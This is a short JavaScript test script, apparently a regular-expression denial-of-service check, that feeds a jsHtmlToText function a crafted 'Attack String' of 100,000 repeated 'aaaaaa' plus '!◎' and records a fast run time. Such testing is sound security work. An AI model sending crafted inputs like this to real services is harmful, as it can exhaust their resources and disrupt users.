const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"aaaaaa"*100000+"!◎"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "aaaaaa";
}
str += "!◎";

var result = htmlToText(str, "");

// real    0m0.131s
// user    0m0.080s
// sys     0m0.034s
